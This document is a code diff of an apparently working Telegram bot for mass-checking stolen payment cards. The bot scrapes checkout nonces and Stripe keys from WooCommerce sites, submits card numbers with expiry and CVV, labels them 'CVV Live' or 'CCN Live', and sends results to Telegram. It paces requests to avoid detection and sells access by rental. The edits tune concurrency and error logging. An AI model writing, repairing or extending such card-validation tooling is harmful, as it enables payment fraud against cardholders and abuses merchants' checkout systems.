@@ -43,9 +43,9 @@ LOGS_CHAT_ID = "6764941964"
 BIN_API_URL = "https://isnotsin.com/bin-info/api?bin="
 
 # OPTIMIZED: Better thread pool configuration for HIGH multi-user performance
-GLOBAL_MAX_WORKERS = 50  # Reduced to prevent resource exhaustion
+GLOBAL_MAX_WORKERS = 30  # Reduced further for 5 users
 USER_MAX_WORKERS = 2
-REQUEST_TIMEOUT = 15  # Increased timeout
+REQUEST_TIMEOUT = 15
 TELEGRAM_TIMEOUT = 10
 MAX_CONCURRENT_USERS = 5
 
@@ -71,7 +71,7 @@ global_thread_pool = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS, thread_n
 user_sessions = {}
 
 # Active user management with better concurrency control
-active_users_lock = threading.RLock()  # Changed to RLock for better synchronization
+active_users_lock = threading.RLock()
 active_users_count = 0
 user_queues = {}
 
@@ -148,9 +148,9 @@ def create_session():
     """Create a requests session with connection pooling"""
     session = requests.Session()
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=20,  # Reduced to prevent connection exhaustion
-        pool_maxsize=100,
-        max_retries=2,  # Increased retries
+        pool_connections=10,  # Reduced for 5 users
+        pool_maxsize=50,
+        max_retries=2,
         pool_block=False
     )
     session.mount('http://', adapter)
@@ -159,6 +159,58 @@ def create_session():
 
 # Global session for connection pooling
 global_session = create_session()
+
+# FIXED: Safe error logging function
+def safe_send_error_log_sync(error_message):
+    """Send error log to logging bot with proper HTML escaping"""
+    try:
+        # Clean the error message to prevent HTML parsing issues
+        clean_error = escape(str(error_message))
+        
+        # Ensure the message is not too long
+        if len(clean_error) > 4000:
+            clean_error = clean_error[:4000] + "..."
+        
+        url = f"https://api.telegram.org/bot{LOGS_BOT_TOKEN}/sendMessage"
+        params = {
+            'chat_id': LOGS_CHAT_ID,
+            'text': f"🚨 {clean_error}",
+            'parse_mode': 'HTML'
+        }
+        
+        # Use a fresh session for error logs
+        max_retries = 2
+        last_exception = None
+        
+        for attempt in range(max_retries):
+            try:
+                session = create_session()
+                response = session.post(url, json=params, timeout=10)
+                session.close()
+                
+                if response.status_code == 200:
+                    return response
+                else:
+                    logger.warning(f"Failed to send error log (attempt {attempt + 1}): {response.text}")
+                    last_exception = Exception(f"HTTP {response.status_code}: {response.text}")
+                    
+            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+                logger.warning(f"Connection error sending error log (attempt {attempt + 1}/{max_retries}): {e}")
+                last_exception = e
+            except Exception as e:
+                logger.error(f"Error sending error log (attempt {attempt + 1}): {e}")
+                last_exception = e
+                break
+            
+            if attempt < max_retries - 1:
+                time.sleep(1)
+        
+        logger.error(f"Failed to send error log after {max_retries} attempts: {last_exception}")
+        return None
+            
+    except Exception as e:
+        logger.error(f"Error in safe_send_error_log_sync: {e}")
+        return None
 
 # UPDATED: Pure results only - only real CVV Live and CCN Live count as live with time format
 def parse_stripe_response(response_text):
@@ -199,7 +251,7 @@ def parse_stripe_response(response_text):
 
 def fetch_nonce_and_key(url):
     try:
-        res = global_session.get(url, timeout=10)  # Increased timeout
+        res = global_session.get(url, timeout=10)
         res.raise_for_status()
         html = res.text
         nonce_match = (re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html) or re.search(r'"_ajax_nonce":"([a-f0-9]{10,})"', html) or re.search(r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10,})"', html))
@@ -209,14 +261,14 @@ def fetch_nonce_and_key(url):
         
         if not nonce or not key:
             site_name = url.split('//')[-1].split('/')[0]
-            error_msg = f"<b>Mass Check Gateway Error</b>\n\n🌐 <b>Site:</b> {site_name}\n❌ <b>Error:</b> Missing Key/Nonce\n⏰ <b>Time:</b> {datetime.now().strftime('%I:%M %p')}\n\n🔧 <i>Site may need maintenance</i>"
-            send_error_log_sync(error_msg)
+            error_msg = f"Mass Check Gateway Error - Site: {site_name} - Missing Key/Nonce"
+            safe_send_error_log_sync(error_msg)
         
         return {'nonce': nonce, 'key': key}
     except requests.exceptions.RequestException as e:
         site_name = url.split('//')[-1].split('/')[0]
-        error_msg = f"<b>Mass Check Gateway Error</b>\n\n🌐 <b>Site:</b> {site_name}\n❌ <b>Error:</b> Connection Failed - {str(e)}\n⏰ <b>Time:</b> {datetime.now().strftime('%I:%M %p')}\n\n🔧 <i>Site may be down</i>"
-        send_error_log_sync(error_msg)
+        error_msg = f"Mass Check Gateway Error - Site: {site_name} - Connection Failed: {str(e)}"
+        safe_send_error_log_sync(error_msg)
         return {'nonce': None, 'key': None}
 
 # FIXED: UserCardProcessor with better error handling and resource management
@@ -270,9 +322,9 @@ class UserCardProcessor:
         while self.processing and not self.card_queue.empty():
             try:
                 # Add delay between requests to avoid detection
-                time.sleep(0.5)  # Increased delay
+                time.sleep(0.5)
                 
-                card = self.card_queue.get(timeout=1.0)  # Increased timeout
+                card = self.card_queue.get(timeout=1.0)
                 if card is None:
                     break
                     
@@ -301,7 +353,7 @@ class UserCardProcessor:
                 status_text = "Approved ✅" if card_type == 'cvv_live' else "CCN Live 🔵"
                 
                 # Format exactly as requested with bold BIN info and mono font for card only
-                message = f"""<code>Card: {number}|{exp_month}|{exp_year}|{cvv}</code>
+                message = f"""CC: <code>{number}|{exp_month}|{exp_year}|{cvv}</code>
 Status: {status_text}
 Response: Card added
 
@@ -501,27 +553,6 @@ Time: {time_taken}s"""
         with active_users_lock:
             self.user_session["current_index"] += 1
             self.user_session["current_card_info"] = None
-        
-    def get_approved_cards(self):
-        """Get the list of approved cards"""
-        with self.processing_lock:
-            return self.approved_cards.copy()
-            
-    def _save_live_card(self, card, message, card_type):
-        """Save live card to file"""
-        try:
-            with open(f'{card_type}_{self.user_session["chat_id"]}.txt', 'a') as f:
-                f.write(f"{card} | {message}\n")
-        except Exception as e:
-            logger.error(f"Error saving {card_type} card: {e}")
-            
-    def _save_declined_card(self, card, result):
-        """Save declined card to file"""
-        try:
-            with open(f'DECLINED_{self.user_session["chat_id"]}.txt', 'a') as f:
-                f.write(f"{card} | {result['rawMessage']}\n")
-        except Exception as e:
-            logger.error(f"Error saving declined card: {e}")
 
 # MODIFIED: Build keyboard without insufficient funds and 3DS/OTP
 def build_keyboard(task_id, counts, current_card_info):
@@ -763,67 +794,6 @@ def get_rental_time_left_detailed(expiry_timestamp):
     minutes = int((time_left % 3600) // 60)
     
     return days, hours, minutes
-
-def send_error_log_sync(error_message):
-    """Send error log to logging bot with rate limiting and better error handling"""
-    try:
-        site_match = re.search(r'Gateway Error on (.*?):', error_message)
-        if site_match:
-            site_name = site_match.group(1)
-            current_time = time.time()
-            
-            if site_name in site_errors:
-                last_report_time, report_count = site_errors[site_name]
-                if current_time - last_report_time < 3600:
-                    if report_count >= MAX_ERROR_REPORTS_PER_HOUR:
-                        logger.info(f"Rate limit reached for {site_name}, skipping error report")
-                        return
-                    site_errors[site_name] = (last_report_time, report_count + 1)
-                else:
-                    site_errors[site_name] = (current_time, 1)
-            else:
-                site_errors[site_name] = (current_time, 1)
-        
-        url = f"https://api.telegram.org/bot{LOGS_BOT_TOKEN}/sendMessage"
-        params = {
-            'chat_id': LOGS_CHAT_ID,
-            'text': f"🚨 {error_message}",
-            'parse_mode': 'HTML'
-        }
-        
-        # Use a fresh session for error logs to avoid connection issues
-        max_retries = 2
-        last_exception = None
-        
-        for attempt in range(max_retries):
-            try:
-                session = create_session()
-                response = session.post(url, json=params, timeout=10)
-                session.close()
-                
-                if response.status_code == 200:
-                    return response  # Success
-                else:
-                    logger.warning(f"Failed to send error log (attempt {attempt + 1}): {response.text}")
-                    last_exception = Exception(f"HTTP {response.status_code}: {response.text}")
-                    
-            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
-                logger.warning(f"Connection error sending error log (attempt {attempt + 1}/{max_retries}): {e}")
-                last_exception = e
-            except Exception as e:
-                logger.error(f"Error sending error log (attempt {attempt + 1}): {e}")
-                last_exception = e
-                break  # Don't retry for other errors
-            
-            if attempt < max_retries - 1:
-                time.sleep(1)
-        
-        logger.error(f"Failed to send error log after {max_retries} attempts: {last_exception}")
-        return None
-            
-    except Exception as e:
-        logger.error(f"Error in send_error_log_sync: {e}")
-        return None
 
 def is_authorized(user_id):
     """Check if user is authorized to use the bot"""
@@ -2279,18 +2249,18 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.error("Exception while handling an update:", exc_info=context.error)
     
     # Log the full error details
-    error_msg = f"⚠️ <b>Bot Error</b>\n\n"
+    error_msg = f"⚠️ Bot Error\n\n"
     
     if update and update.effective_message:
-        error_msg += f"<b>Chat:</b> {update.effective_chat.id if update.effective_chat else 'N/A'}\n"
-        error_msg += f"<b>User:</b> {update.effective_user.id if update.effective_user else 'N/A'}\n"
+        error_msg += f"Chat: {update.effective_chat.id if update.effective_chat else 'N/A'}\n"
+        error_msg += f"User: {update.effective_user.id if update.effective_user else 'N/A'}\n"
     
-    error_msg += f"<b>Error:</b> {type(context.error).__name__}\n"
-    error_msg += f"<b>Message:</b> {str(context.error)}\n"
-    error_msg += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-d %I:%M %p')}"
+    error_msg += f"Error: {type(context.error).__name__}\n"
+    error_msg += f"Message: {str(context.error)}\n"
+    error_msg += f"Time: {datetime.now().strftime('%Y-%m-d %I:%M %p')}"
     
-    # Send error log via the logging bot
-    send_error_log_sync(error_msg)
+    # Send error log via the logging bot with safe function
+    safe_send_error_log_sync(error_msg)
     
     # Optional: Notify user about the error
     try:
